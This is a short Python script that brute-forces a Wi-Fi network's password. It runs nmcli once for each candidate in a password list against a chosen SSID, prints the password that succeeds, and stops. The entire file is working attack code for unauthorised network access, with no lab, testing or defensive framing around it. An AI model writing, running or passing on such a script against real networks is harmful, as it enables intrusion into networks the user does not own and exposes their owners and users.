#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import subprocess

def test_wifi_password(ssid, password):
    """Test if a password works for a given Wi-Fi SSID."""
    try:
        # Use nmcli to connect to the Wi-Fi network
        result = subprocess.run(
            ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        if result.returncode == 0:
            print(f"[+] Success! Password for {ssid}: {password}")
            return True
        else:
            print(f"[-] Failed: {password}")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def start(ssid, password_list):
    """Test a list of passwords on a specific Wi-Fi network."""
    for password in password_list:
        if test_wifi_password(ssid, password.strip()):
            break